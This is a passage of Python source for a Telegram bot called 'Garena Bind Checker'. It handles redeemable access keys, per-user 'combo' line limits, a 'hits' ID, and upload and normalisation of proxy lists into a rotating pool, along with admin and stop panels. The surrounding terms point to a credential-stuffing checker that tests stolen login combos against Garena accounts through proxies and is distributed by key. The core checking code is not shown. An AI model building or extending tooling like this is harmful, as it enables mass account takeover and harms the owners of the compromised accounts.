    confirm_label = f"🗑 Delete ({sel_count})" if sel_count else "🗑 Delete"
    rows.append([
        {"text": confirm_label,  "callback_data": "dk_confirm"},
        {"text": "🔲 Clear",     "callback_data": "dk_sel:none"},
        {"text": "❌ Cancel",    "callback_data": "dk_cancel"},
    ])
    return rows


def _deletekey_header(keys: dict, selected: set, now: float) -> str:
    total    = len(keys)
    active   = sum(1 for v in keys.values() if now < v.get("expires", 0))
    expired  = sum(1 for v in keys.values() if now >= v.get("expires", 0))
    sel      = len(selected)
    return (
        f"🗑 <b>Delete Keys</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🔢 Total: <b>{total}</b>  ✅ Active: <b>{active}</b>  ❌ Expired: <b>{expired}</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{'🔘 <b>'+str(sel)+' key(s) selected</b>' if sel else '<i>Tap keys to select for deletion</i>'}\n\n"
        f"<b>Key</b>  ·  <b>Status</b>  ·  <b>Used</b>"
    )


def _handle_delete_key(token: str, chat_id, from_user: dict, args: str):
    if not _is_owner(from_user):
        _tg_send(token, chat_id, "🚫 <b>Owner only command.</b>")
        return

    keys = _load_keys()
    now  = time.time()

    if not keys:
        _tg_send(token, chat_id, "📭 <b>No keys found.</b>")
        return

    # Direct one-shot commands still supported: /deletekey expired|unused|all|KEY
    args = args.strip()
    if args:
        if args.lower() == "expired":
            to_del = [k for k, v in keys.items() if now >= v.get("expires", 0)]
            if not to_del:
                _tg_send(token, chat_id, "✅ No expired keys to delete.")
                return
            for k in to_del: del keys[k]
            _save_keys(keys)
            _tg_send(token, chat_id,
                f"🗑 <b>Deleted {len(to_del)} expired key(s).</b>\n"
                f"<i>Remaining: {len(keys)}</i>")
            return
        if args.lower() == "unused":
            to_del = [k for k, v in keys.items() if not v.get("used_by")]
            if not to_del:
                _tg_send(token, chat_id, "✅ No unused keys to delete.")
                return
            for k in to_del: del keys[k]
            _save_keys(keys)
            _tg_send(token, chat_id,
                f"🗑 <b>Deleted {len(to_del)} unused key(s).</b>\n"
                f"<i>Remaining: {len(keys)}</i>")
            return
        if args.lower() == "all":
            count = len(keys)
            keys.clear()
            _save_keys(keys)
            _deletekey_selection.pop(chat_id, None)
            _tg_send(token, chat_id, f"🗑 <b>All {count} key(s) deleted.</b>")
            return
        # Specific key
        target = args.upper()
        if target not in keys:
            _tg_send(token, chat_id, f"❌ Key <code>{target}</code> not found.")
            return
        entry = keys.pop(target)
        _save_keys(keys)
        exp_dt = datetime.fromtimestamp(entry.get("expires", 0)).strftime("%Y-%m-%d %H:%M")
        used   = entry.get("used_by") or "never used"
        _tg_send(token, chat_id,
            f"🗑 <b>Key Deleted</b>\n\n"
            f"🔑 <code>{target}</code>\n"
            f"📅 Was expiring: {exp_dt}\n"
            f"👤 Used by: <code>{used}</code>")
        return

    # ── Interactive picker — no args ────────────────────────────
    _deletekey_selection[chat_id] = set()   # fresh selection
    kb = _build_deletekey_keyboard(keys, set(), now)
    _tg_send_buttons(token, chat_id,
        _deletekey_header(keys, set(), now), kb)


# ── /redeem — with inline button if no key given ───────────────
def _handle_redeem(token: str, chat_id, from_user: dict, key_arg: str):
    # ── No key typed → prompt with button ─────────────────────
    if not key_arg.strip():
        _bot_state[chat_id] = "AWAIT_REDEEM_KEY"
        _tg_send_buttons(token, chat_id,
            "🔑 <b>Redeem Key</b>\n\n"
            "Type your key in the chat, or tap the button below:\n\n"
            "<i>Format: <code>/redeem YOUR_KEY</code></i>",
            [
                [{"text": "⌨️ Type my key now", "callback_data": "redeem:prompt"}],
            ]
        )
        return

    key     = key_arg.strip().upper()
    keys    = _load_keys()
    now     = time.time()
    uid_str = str(chat_id)

    if key not in keys:
        _tg_send_buttons(token, chat_id,
            "❌ <b>Invalid key.</b>\n\n"
            "Please check the key and try again.",
            [[{"text": "🔄 Try again", "callback_data": "redeem:prompt"}]]
        )
        return

    entry = keys[key]

    # ── Expiry check ───────────────────────────────────────────
    if now > entry["expires"]:
        _tg_send(token, chat_id,
            "⌛ <b>This key has expired.</b>\n"
            "Ask the owner for a new one.")
        return

    # ── Migrate legacy keys: used_by was a single string ──────
    used_by = entry.get("used_by", [])
    if isinstance(used_by, str):
        used_by = [used_by] if used_by else []
        entry["used_by"] = used_by

    max_users = entry.get("max_users", 1)   # 0 = unlimited

    # ── Already redeemed by this user → refresh + re-ask setup ─
    if uid_str in used_by:
        d = _udata(chat_id)
        d["key"]         = key
        d["key_expires"] = entry["expires"]
        d["combo_limit"] = entry.get("combo_limit", 500)
        _save_profile(chat_id, d)
        remaining  = int(entry["expires"] - now)
        hrs  = remaining // 3600
        mins = (remaining % 3600) // 60
        slots_max = "∞" if max_users == 0 else str(max_users)
        _tg_send(token, chat_id,
            f"✅ <b>Access Restored!</b> ⭐ VIP\n\n"
            f"🔑 <b>Key:</b> <code>{key}</code>\n"
            f"⏳ <b>Valid for:</b> {hrs}h {mins}m\n"
            f"👥 <b>Slots:</b> {len(used_by)}/{slots_max}\n"
            f"📦 <b>Combo limit:</b> ∞ Unlimited\n\n"
            f"<i>Update your settings below 👇</i>"
        )
        _ask_level(token, chat_id)
        return

    # ── User limit check ───────────────────────────────────────
    if max_users != 0 and len(used_by) >= max_users:
        _tg_send(token, chat_id,
            f"🔒 <b>Key is full!</b>\n\n"
            f"This key already has <b>{len(used_by)}/{max_users}</b> users.\n"
            f"Ask the owner for a new key.")
        return

    # ── Add this user ──────────────────────────────────────────
    used_by.append(uid_str)
    entry["used_by"] = used_by
    _save_keys(keys)

    d = _udata(chat_id)
    d["key"]         = key
    d["key_expires"] = entry["expires"]
    d["combo_limit"] = entry.get("combo_limit", 500)
    _save_profile(chat_id, d)

    remaining  = int(entry["expires"] - now)
    hrs  = remaining // 3600
    mins = (remaining % 3600) // 60
    slots_used = len(used_by)
    slots_max  = "∞" if max_users == 0 else str(max_users)

    # ── Success message ────────────────────────────────────────
    _tg_send(token, chat_id,
        f"✅ <b>Key Redeemed Successfully!</b> ⭐ VIP\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🔑 <b>Key:</b> <code>{key}</code>\n"
        f"⏳ <b>Valid for:</b> {hrs}h {mins}m\n"
        f"👥 <b>Slots:</b> {slots_used}/{slots_max} used\n"
        f"📦 <b>Combo limit:</b> ∞ Unlimited\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"<i>Now set up your preferences below 👇</i>"
    )

    # ── Immediately show level picker ──────────────────────────
    _ask_level(token, chat_id)


def _check_access(token: str, chat_id, from_user: dict) -> bool:
    """Returns True if user is allowed to use the checker."""
    if _is_owner(from_user):
        return True

    uid_str = str(chat_id)
    d = _udata(chat_id)
    key         = d.get("key")
    key_expires = d.get("key_expires", 0)

    if key and time.time() < key_expires:
        return True

    # Also check saved profile on disk
    saved = _get_saved_profile(str(from_user.get("id", chat_id)))
    if saved:
        if saved.get("key") and time.time() < saved.get("key_expires", 0):
            # Restore into memory
            d["key"]         = saved["key"]
            d["key_expires"] = saved["key_expires"]
            d["combo_limit"] = saved.get("combo_limit", 500)
            return True

    _tg_send(token, chat_id,
        "🔒 <b>Access Required</b>\n\n"
        "You need a valid redeem key to use this bot.\n\n"
        "Use <code>/redeem YOUR_KEY</code> to unlock.\n"
        "<i>Contact the owner to get a key.</i>"
    )
    return False


# ══════════════════════════════════════════════════════════════
#  PROXY UPLOAD via Telegram
# ══════════════════════════════════════════════════════════════
def _normalize_proxy_line(line: str) -> str | None:
    """
    Convert ANY proxy format into a valid http://user:pass@host:port URL.

    Handles ALL of these formats robustly:
      host:port
      host:port:user:pass          (port is 2nd part)
      user:pass@host:port
      http://host:port
      http://host:port:user:pass   ← owlproxy / rotating proxy style
      http://user:pass@host:port
      https://...  socks5://...
      ip:port:username:password
      username:password:ip:port

    The key fix: after stripping scheme, if we have 4 parts and BOTH parts[1]
    AND parts[3] are digits, we use the FIRST numeric as port (host:port:user:pass).
    """
    import re
    raw = line.strip()
    if not raw or raw.startswith("#"):
        return None

    # ── Step 1: strip scheme, keep original scheme for reconstruction ──
    scheme = "http"
    l = raw
    m = re.match(r"^(https?|socks5?h?)://(.*)$", l, re.IGNORECASE)
    if m:
        scheme = "http"   # normalise everything to http for proxy use
        l = m.group(2)

    # ── Step 2: handle user:pass@host:port (@ separator) ──────────────
    if "@" in l:
        creds, _, hostport = l.partition("@")
        # hostport may be host:port
        hp = hostport.rsplit(":", 1)
        if len(hp) == 2 and hp[1].isdigit():
            return f"http://{creds}@{hostport}"
        # hostport with no port — still usable as-is
        return f"http://{creds}@{hostport}" if hostport else None

    # ── Step 3: split by colon ─────────────────────────────────────────
    parts = l.split(":")

    if len(parts) == 2:
        # host:port
        host, port = parts[0].strip(), parts[1].strip()
        if port.isdigit():
            return f"http://{host}:{port}"
        return None

    if len(parts) == 3:
        # Could be host:port:junk — keep host:port if middle is a port number
        if parts[1].strip().isdigit():
            return f"http://{parts[0].strip()}:{parts[1].strip()}"
        # user:pass:host  (rare, no port — skip)
        return None

    if len(parts) == 4:
        a, b, c, d = [p.strip() for p in parts]

        # ── PRIORITY: host:port:user:pass  (b is port AND b < d numerically) ──
        # This covers:  change5.owlproxy.com:7778:e9wz239QA360_..._time_5:2484124
        # b = "7778" (port),  d = "2484124" (password)
        if b.isdigit():
            return f"http://{c}:{d}@{a}:{b}"

        # ── Fallback: user:pass:host:port  (d is port, b is NOT a port) ──
        if d.isdigit():
            return f"http://{a}:{b}@{c}:{d}"

        return None

    if len(parts) == 5:
        # scheme was already stripped; could be host:port:user:pass:extra — try first 4
        a, b, c, d, *_ = [p.strip() for p in parts]
        if b.isdigit():
            return f"http://{c}:{d}@{a}:{b}"
        if d.isdigit():
            return f"http://{a}:{b}@{c}:{d}"
        return None

    # More than 5 parts — try last two as user:pass and search for port
    # e.g. custom rotating proxies with long usernames containing colons
    # Strategy: find first numeric part that looks like a port (< 65536)
    for i, p in enumerate(parts):
        if p.strip().isdigit() and int(p.strip()) < 65536 and i > 0:
            host    = ":".join(parts[:i])
            port    = p.strip()
            rest    = parts[i+1:]
            if len(rest) >= 2:
                user = rest[0].strip()
                pwd  = ":".join(r.strip() for r in rest[1:])
                return f"http://{user}:{pwd}@{host}:{port}"
            return f"http://{host}:{port}"

    return None


def _preprocess_proxy_text(raw_text: str) -> list:
    """
    Telegram wraps long proxy lines into multiple display lines when pasted.
    Example — one proxy becomes:

        http://change5.owlproxy.com:7778:e9wz239QA360_custom_zone_PH_st__city_sid_47320445_t
        ime_5:2484124

    The tricky part: each fragment can LOOK like a valid proxy on its own
    (frag1 = http://host:port:partial_user → parses as host:port,
     frag2 = ime_5:2484124 → parses as user:pass).

    REAL FIX: a line that starts with http:// and contains a scheme MUST have
    the username portion (3rd colon-field) that is a non-trivial string.
    We detect "probably a fragment continuation" by checking:
      • frag2 has no scheme AND no dot in the first segment AND is not a
        standalone ip:port — meaning it's a raw continuation word like "ime_5:2484124"

    Algorithm: buffer a line that ends with a truncated username (i.e. has
    http://host:port: prefix with NO closing :password yet), then join the
    next line to it.
    """
    import re

    SCHEME_RE  = re.compile(r"^https?://", re.IGNORECASE)
    # Matches lines like "http://host:port:partial_username" — has scheme,
    # has exactly ONE numeric port segment, then a non-empty username start,
    # but the username does NOT have a trailing :password (no 4th colon-field)
    TRUNCATED_RE = re.compile(
        r"^https?://[^:]+:\d{2,5}:[^:]+$",   # scheme://host:port:user  (no :pass yet)
        re.IGNORECASE
    )
    # A line is a "continuation fragment" if it has no scheme, no dot in the
    # leading segment (so not a hostname), and looks like  word:digits
    FRAGMENT_RE = re.compile(r"^[A-Za-z0-9_]+:\d+$")

    def _is_truncated_owlstyle(s: str) -> bool:
        """True if line is http://host:port:user with no :password — a cut proxy."""
        return bool(TRUNCATED_RE.match(s))

    def _is_continuation_fragment(s: str) -> bool:
        """True if line is a word fragment like 'ime_5:2484124'."""
        if SCHEME_RE.match(s):
            return False
        # No dot in first segment → not a hostname → fragment
        first = s.split(":")[0]
        if "." not in first and not re.match(r"^\d+$", first):
            return True
        return False

    lines  = raw_text.splitlines()
    result = []
    buffer = ""

    for raw in lines:
        stripped = raw.strip()

        if not stripped:
            if buffer:
                result.append(buffer)
                buffer = ""
            continue

        if stripped.startswith("#"):
            if buffer:
                result.append(buffer)
                buffer = ""
            result.append(stripped)
            continue

        if not buffer:
            # Check if this line is a truncated owlproxy-style line
            if _is_truncated_owlstyle(stripped):
                buffer = stripped   # buffer it — next line is the :password
            else:
                result.append(stripped)
        else:
            # We have a buffered truncated line — append this fragment
            candidate = buffer + stripped
            buffer = ""
            result.append(candidate)

    if buffer:
        result.append(buffer)

    # Second pass: also rejoin any remaining fragment pairs we may have missed
    # (handles 3-line wraps or other edge cases)
    final = []
    i = 0
    while i < len(result):
        line = result[i]
        # If next line exists and looks like a bare continuation fragment,
        # join it to this line
        if (i + 1 < len(result)
                and _is_continuation_fragment(result[i + 1])
                and not _normalize_proxy_line(result[i + 1]).__class__.__name__ == "NoneType"  # noqa
                and _normalize_proxy_line(line + result[i + 1]) is not None
                and _normalize_proxy_line(result[i + 1]) is None):
            # The fragment alone doesn't parse but joined it does
            final.append(line + result[i + 1])
            i += 2
        else:
            final.append(line)
            i += 1

    return [r for r in final if r.strip()]


def _save_proxies_from_lines(raw_lines: list) -> tuple:
    """
    Parse and normalize proxy lines, save to proxy/pasted_proxies.txt,
    reload geo_rotator. Returns (valid_count, skipped, save_path).
    """
    os.makedirs(PROXY_FOLDER, exist_ok=True)

    # Re-join any Telegram-wrapped lines before parsing
    joined_text = "\n".join(raw_lines)
    processed   = _preprocess_proxy_text(joined_text)

    normalized = []
    skipped    = 0

    for line in processed:
        result = _normalize_proxy_line(line)
        if result:
            normalized.append(result)
        elif line.strip() and not line.strip().startswith("#"):
            skipped += 1

    # Deduplicate
    seen  = set()
    dedup = []
    for p in normalized:
        if p not in seen:
            seen.add(p)
            dedup.append(p)

    save_path = os.path.join(PROXY_FOLDER, "pasted_proxies.txt")

    # Append to existing file if present, else create new
    existing = set()
    if os.path.exists(save_path):
        with open(save_path, "r", encoding="utf-8", errors="ignore") as f:
            existing = {l.strip() for l in f if l.strip() and not l.startswith("#")}

    new_proxies = [p for p in dedup if p not in existing]

    with open(save_path, "a", encoding="utf-8") as f:
        for p in new_proxies:
            f.write(p + "\n")

    try:
        geo_rotator._load_all_files()
    except Exception:
        pass

    return len(new_proxies), skipped, save_path


def _unique_proxy_path(folder: str, file_name: str) -> str:
    """Return a unique path inside folder — auto-renames if file already exists.
    e.g. proxies.txt → proxies_1.txt → proxies_2.txt
    """
    base, ext = os.path.splitext(file_name)
    candidate = os.path.join(folder, file_name)
    counter   = 1
    while os.path.exists(candidate):
        candidate = os.path.join(folder, f"{base}_{counter}{ext}")
        counter  += 1
    return candidate


def _flush_proxy_accumulator(token: str, chat_id):
    """Save all accumulated proxy lines, delete all pasted messages, report results."""
    lines   = _proxy_accumulator.pop(chat_id, [])
    msg_ids = _proxy_msg_ids.pop(chat_id, [])

    # ── Delete every pasted message + bot reply from chat ─────
    if msg_ids:
        _tg_delete_messages_bulk(token, chat_id, msg_ids)

    if not lines:
        _tg_send(token, chat_id,
            "⚠️ <b>No proxy lines accumulated.</b>\n"
            "Paste some proxies first, then tap Done.")
        return

    valid_count, skipped, save_path = _save_proxies_from_lines(lines)
    total_now = geo_rotator.total

    _tg_send(token, chat_id,
        f"✅ <b>Proxies Saved!</b>\n\n"
        f"✏️ <b>Source:</b> Pasted text (multi-message)\n"
        f"✅ <b>New proxies added:</b> <code>{valid_count}</code>\n"
        f"❌ <b>Skipped (invalid):</b> <code>{skipped}</code>\n\n"
        f"📡 <b>Proxy pool now:</b> <code>{total_now}</code> total\n"
        f"💾 <b>Saved to:</b> <code>proxy/pasted_proxies.txt</code>"
    )
    _bot_state.pop(chat_id, None)


def _handle_proxy_upload(token: str, chat_id, from_user: dict, message: dict):
    """
    Handle proxy upload — supports:
      1. .txt file attachment  (processed immediately)
      2. Pasted proxy lines as text — can span MULTIPLE messages.
         Owner pastes batches across several messages; bot accumulates them
         all. When done, owner sends /done (or taps the Done button) and
         the bot saves + reloads the full pool.
    """
    if not _is_owner(from_user):
        _tg_send(token, chat_id, "🚫 <b>Owner only command.</b>")
        return

    document = message.get("document")
    text     = message.get("text", "").strip()

    # ── /done or /proxy_done — finish accumulation and save ───
    if text.lower() in ("/done", "done", "/proxy_done"):
        _flush_proxy_accumulator(token, chat_id)
        return

    # ── No content yet — show instructions with buttons ───────
    if not document and not text and not message.get("caption"):
        # Clear any existing accumulator for a fresh session
        _proxy_accumulator.pop(chat_id, None)
        _tg_send_buttons(token, chat_id,
            "📡 <b>Upload Proxy</b>\n\n"
            "Choose how to add proxies:\n\n"
            "📎 <b>Send a .txt file</b> — processed immediately\n\n"
            "✏️ <b>Paste proxy lines</b> — send as many messages as you want,\n"
            "   then tap <b>✅ Done</b> when finished\n\n"
            "<b>Supported formats:</b>\n"
            "<code>host:port</code>\n"
            "<code>host:port:user:pass</code>\n"
            "<code>http://host:port:user:pass</code>\n"
            "<code>user:pass@host:port</code>\n\n"
            "<i>Long lines that Telegram wraps are auto-rejoined.</i>",
            [
                [
                    {"text": "✅ Done (save all)",  "callback_data": "proxy:done"},
                    {"text": "🗑 Clear & Cancel",   "callback_data": "proxy:cancel"},
                ],
            ]
        )
        return

    # ── Text input — accumulate across messages ────────────────
    if text and not document:
        raw_lines = text.splitlines()

        # Single-line command triggers — show instructions
        if len(raw_lines) == 1 and raw_lines[0].startswith("/") and raw_lines[0].lower() not in ("/done",):
            _tg_send_buttons(token, chat_id,
                "📡 <b>Upload Proxy</b>\n\n"
                "Paste your proxy lines (one or many messages).\n"
                "Tap <b>✅ Done</b> when you've sent all proxies.\n\n"
                "<b>Formats:</b> host:port · host:port:user:pass · http://host:port:user:pass",
                [
                    [
                        {"text": "✅ Done (save all)", "callback_data": "proxy:done"},
                        {"text": "🗑 Clear & Cancel",  "callback_data": "proxy:cancel"},
                    ],
                ]
            )
            return

        # Track the user's own message ID for deletion later
        user_msg_id = message.get("message_id")
        if user_msg_id:
            _proxy_msg_ids.setdefault(chat_id, []).append(user_msg_id)

        # Accumulate lines
        if chat_id not in _proxy_accumulator:
            _proxy_accumulator[chat_id] = []
        _proxy_accumulator[chat_id].extend(raw_lines)
        count_so_far = len(_proxy_accumulator[chat_id])

        # Send the "batch received" status and track its message ID too
        bot_reply = _tg_send_buttons(token, chat_id,
            f"📥 <b>Batch received!</b> Lines so far: <code>{count_so_far}</code>\n"
            f"<i>Keep sending more, or tap Done to save.</i>",
            [
                [
                    {"text": "✅ Done (save all)", "callback_data": "proxy:done"},
                    {"text": "🗑 Clear & Cancel",  "callback_data": "proxy:cancel"},
                ],
            ]
        )
        # Track the bot's own reply message ID
        if bot_reply and bot_reply.get("ok"):
            bot_msg_id = bot_reply["result"]["message_id"]
            _proxy_msg_ids.setdefault(chat_id, []).append(bot_msg_id)
        return

    # ── File attachment ─────────────────────────────────────────
    if not document:
        _tg_send(token, chat_id,
            "⚠️ Please send a <code>.txt</code> file or paste proxy lines as text.")
        return

    file_name = document.get("file_name", "proxies.txt")
    if not file_name.lower().endswith(".txt"):
        _tg_send(token, chat_id, "❌ Only <code>.txt</code> files accepted.")
        return

    dl_url = _tg_get_file_url(token, document.get("file_id"))
    if not dl_url:
        _tg_send(token, chat_id, "❌ Could not get download link. Try again.")
        return

    os.makedirs(PROXY_FOLDER, exist_ok=True)
    save_path   = _unique_proxy_path(PROXY_FOLDER, file_name)
    saved_name  = os.path.basename(save_path)
    was_renamed = saved_name != file_name
    try:
        r = requests.get(dl_url, timeout=30)
        r.raise_for_status()
        with open(save_path, "wb") as f:
            f.write(r.content)
    except Exception as e:
        _tg_send(token, chat_id, f"❌ Download failed: {e}")
        return

    try:
        with open(save_path, "r", encoding="utf-8", errors="ignore") as f:
            raw_text = f.read()
    except Exception:
        raw_text = ""

    processed   = _preprocess_proxy_text(raw_text)
    valid_count = 0
    skipped     = 0
    normalized  = []
    for line in processed:
        result = _normalize_proxy_line(line)
        if result:
            normalized.append(result)
            valid_count += 1
        elif line.strip() and not line.strip().startswith("#"):
            skipped += 1

    if normalized:
        with open(save_path, "w", encoding="utf-8") as f:
            for p in normalized:
                f.write(p + "\n")
    else:
        try:
            os.remove(save_path)
        except Exception:
            pass
        _tg_send(token, chat_id,
            "❌ <b>No valid proxy lines found in file.</b>\n\n"
            "Make sure the file contains proxies in a supported format.")
        return

    try:
        geo_rotator._load_all_files()
        total_now = geo_rotator.total
    except Exception:
        total_now = valid_count

    rename_note = (
        f"\n📝 <b>Renamed:</b> <code>{file_name}</code> → <code>{saved_name}</code>"
        if was_renamed else ""
    )
    proxy_files_list = "\n".join(
        f"  📄 {os.path.basename(p)}"
        for p in _get_proxy_files()
    ) or "  <i>none</i>"

    _tg_send(token, chat_id,
        f"✅ <b>Proxy File Uploaded!</b>\n\n"
        f"📄 <b>File:</b>    <code>{saved_name}</code>{rename_note}\n"
        f"✅ <b>Valid:</b>   <code>{valid_count}</code> proxies\n"
        f"❌ <b>Skipped:</b> <code>{skipped}</code>\n\n"
        f"📡 <b>Proxy pool now:</b> <code>{total_now}</code> total\n\n"
        f"<b>All proxy files:</b>\n{proxy_files_list}"
    )


def _handle_proxy_status(token: str, chat_id, from_user: dict):
    """Show current proxy files and counts."""
    if not _is_owner(from_user):
        _tg_send(token, chat_id, "🚫 <b>Owner only command.</b>")
        return

    files = _get_proxy_files()
    if not files:
        _tg_send(token, chat_id,
            "📡 <b>Proxy Files</b>\n\n"
            "<i>No proxy files found in proxy/ folder.</i>\n\n"
            "Use <code>/upload_proxy</code> to upload one.")
        return

    lines_out = []
    total = 0
    for fpath in files:
        fname = os.path.basename(fpath)
        try:
            size_kb = os.path.getsize(fpath) / 1024
            with open(fpath, "r", encoding="utf-8", errors="ignore") as f:
                count = sum(1 for l in f if l.strip() and not l.startswith("#") and ":" in l)
        except Exception:
            count, size_kb = 0, 0
        total += count
        lines_out.append(f"  📄 {fname}\n  📊 {count:,} proxies · {size_kb:.1f}KB")

    body = "\n\n".join(lines_out)
    _tg_send(token, chat_id,
        f"📡 <b>Proxy Files</b>\n\n"
        f"{body}\n\n"
        f"🔢 <b>Total: {total:,} in {len(files)} file(s)</b>"
    )


# ── update router ──────────────────────────────────────────────
# ── /help ──────────────────────────────────────────────────────
def _handle_help(token: str, chat_id, from_user: dict):
    name = from_user.get("first_name", "User")

    if _is_owner(from_user):
        # ── Owner admin panel ──────────────────────────────────
        keys      = _load_keys()
        total_keys = len(keys)
        active_keys = sum(
            1 for k in keys.values()
            if time.time() < k.get("expires", 0)
        )
        used_keys = sum(1 for k in keys.values() if k.get("used_by"))

        saved     = _load_saved_users() if callable(getattr(_load_saved_users, '__call__', None)) else _saved_users
        total_users = len({v.get("hits_id") for v in _saved_users.values() if isinstance(v, dict) and "hits_id" in v})
        active_users = len([c for c, s in _bot_state.items() if s == "RUNNING"])

        proxy_total = geo_rotator.total

        _tg_send_buttons(token, chat_id,
            f"⚙️ <b>Admin Panel</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"👥 <b>Users:</b> {total_users}  (Active: {active_users})\n"
            f"📡 <b>Proxies:</b> {proxy_total} loaded\n"
            f"🔑 <b>Keys:</b> {total_keys} total · {active_keys} active · {used_keys} used\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<i>by @Yukiii_ii</i>",
            [
                [
                    {"text": "🔑 Generate Key",  "callback_data": "admin:genkey"},
                    {"text": "📋 Key Status",    "callback_data": "admin:statuskey"},
                ],
                [
                    {"text": "🗑 Delete Keys",   "callback_data": "admin:deletekey_menu"},
                    {"text": "📡 Proxy Status",  "callback_data": "admin:proxystatus"},
                ],
                [
                    {"text": "📤 Upload Proxy",    "callback_data": "admin:upload_proxy"},
                    {"text": "🔄 Refresh Panel",   "callback_data": "admin:refresh"},
                ],
                [
                    {"text": "📊 Server Status",   "callback_data": "admin:serverstatus"},
                ],
            ]
        )

    else:
        # ── Regular user help — menu with inline buttons ───────
        d          = _udata(chat_id)
        key        = d.get("key")
        key_exp    = d.get("key_expires", 0)
        has_access = bool(key and time.time() < key_exp)

        if has_access:
            remaining = int(key_exp - time.time())
            hrs  = remaining // 3600
            mins = (remaining % 3600) // 60
            access_line = f"✅ <b>Access:</b> Valid — expires in {hrs}h {mins}m\n"
        else:
            access_line = "🔒 <b>Access:</b> No active key\n"

        lvl_label = "ALL" if d.get("level") == [1] else (
            f"Level {d['level'][0]}+" if d.get("level") else "—"
        )
        cf_map   = {"clean": "✅ CLEAN only", "notclean": "❌ NOT CLEAN only", "both": "🔄 BOTH"}
        cf_label = cf_map.get(d.get("clean_filter", ""), "—")
        is_vip = _is_vip_user(chat_id)
        limit_disp = "∞ unlimited" if is_vip else f"{d.get('combo_limit', COMBO_LINE_LIMIT)} lines"
        vip_badge = " ⭐ VIP" if is_vip else ""

        _tg_send_buttons(token, chat_id,
            f"🤖 <b>Garena Bind Checker</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"👋 Hey, <b>{name}</b>!{vip_badge}\n\n"
            f"{access_line}"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📋 <b>Your Config:</b>\n"
            f"  🆔 Hits ID:  <code>{d.get('hits_id', '—')}</code>\n"
            f"  🎮 Level:    <code>{lvl_label}</code>\n"
            f"  🔍 Hit type: <code>{cf_label}</code>\n"
            f"  📦 Limit:    <code>{limit_disp}</code>\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<i>by @Yukiii_ii</i>",
            [
                [
                    {"text": "▶️ Start / Resume",  "callback_data": "user:start"},
                    {"text": "🔄 Reset Settings",  "callback_data": "user:reset"},
                ],
                [
                    {"text": "🔑 Redeem Key",       "callback_data": "user:redeem"},
                    {"text": "🛑 Stop Checker",     "callback_data": "user:stop"},
                ],
                [
                    {"text": "🔄 Refresh",          "callback_data": "user:refresh_help"},
                ],
            ]
        )


def _build_stop_keyboard(include_stop_all: bool = True) -> tuple:
    """
    Build a stop panel keyboard showing every currently running checker.
    Returns (text, buttons).
    """
    now_running = {
        cid: evt
        for cid, evt in _stop_events.items()
        if not evt.is_set()
    }

    if not now_running:
        return (
            "ℹ️ <b>No checkers running right now.</b>",
            []
        )

    rows   = []
    lines  = [
        "🛑 <b>Stop Checker</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🏃 <b>{len(now_running)}</b> checker(s) currently running:\n"
    ]

    for cid in now_running:
        bar = _active_bars.get(cid, {})
        done  = bar.get("done",  0)
        total = bar.get("total", 0)
        pct   = f"{done/total*100:.1f}%" if total else "—"
        # Show username if saved, else just the ID
        saved = _get_saved_profile(str(cid))
        uname = saved.get("username", "") if saved else ""
        label = f"@{uname}" if uname else f"id:{cid}"
        lines.append(f"  • {label} — {done}/{total} ({pct})")
        rows.append([{
            "text":          f"🛑 Stop {label} ({pct})",
            "callback_data": f"stop_user:{cid}",
        }])

    if include_stop_all and len(now_running) > 1:
        rows.append([{
            "text":          f"☢️ Stop ALL ({len(now_running)} users)",
            "callback_data": "stop_all",
        }])

    rows.append([{"text": "❌ Cancel", "callback_data": "stop_cancel"}])

    return "\n".join(lines), rows


def _handle_stop_panel(token: str, chat_id, from_user: dict):
    """Show the interactive stop panel. Owner sees all users; regular user sees only self."""
    if _is_owner(from_user):
        text, kb = _build_stop_keyboard(include_stop_all=True)
        if kb:
            _tg_send_buttons(token, chat_id, text, kb)
        else:
            _tg_send(token, chat_id, text)
    else:
        # Regular user — only show their own checker
        evt = _stop_events.get(chat_id)
        if evt and not evt.is_set():
            bar   = _active_bars.get(chat_id, {})
            done  = bar.get("done",  0)
            total = bar.get("total", 0)
            pct   = f"{done/total*100:.1f}%" if total else "—"
            # Try to get enhanced fancy progress from live_stats
            ls = bar.get("live_stats")
            progress_text = ""
            if ls:
                tp = ls.get_fancy_telegram_progress()
                if not tp:
                    tp = ls.get_telegram_progress()
                if tp:
                    progress_text = f"\n\n{tp}"
            _tg_send_buttons(token, chat_id,
                f"🛑 <b>Your checker is running</b>\n\n"
                f"📊 Progress: <code>{done}/{total}</code> ({pct}){progress_text}\n\n"
                f"Tap below to stop it:",
                [
                    [{"text": f"🛑 Stop my checker ({pct})", "callback_data": f"stop_user:{chat_id}"}],
                    [{"text": "❌ Keep running",              "callback_data": "stop_cancel"}],
                ]
            )
        else:
            _tg_send(token, chat_id, "ℹ️ <b>No checker is currently running.</b>")


def _handle_callback_query(token: str, cq: dict):
    """Handle all inline button presses."""
    cq_id     = cq["id"]
    from_user = cq.get("from", {})
    message   = cq.get("message")
    data      = cq.get("data", "")

    # Always answer the callback FIRST to remove loading spinner
    _tg_answer_callback(token, cq_id)

    if not message:
        logger.warning(f"[BOT] Callback query with no message — cq_id={cq_id} data={data!r}")
        return
    chat_id = message["chat"]["id"]
    logger.info(f"[BOT] 🔘 callback data={data!r} from={from_user.get('id')} chat={chat_id}")

    # ── Admin panel button routing ─────────────────────────────
    if data == "admin:genkey":
        if not _is_owner(from_user): return
        _genkey_wizard[chat_id] = {"step": "AWAIT_DURATION"}
        _tg_send_buttons(token, chat_id,
            "🔑 <b>Generate Key — Step 1 of 4</b>\n\n"
            "⏳ How long should the key be valid?\n\n"
            "<i>Tap a button or type a custom duration</i>",
            [
                [
                    {"text": "1 Hour",   "callback_data": "gk_dur:3600"},
                    {"text": "6 Hours",  "callback_data": "gk_dur:21600"},
                    {"text": "12 Hours", "callback_data": "gk_dur:43200"},
                ],
                [
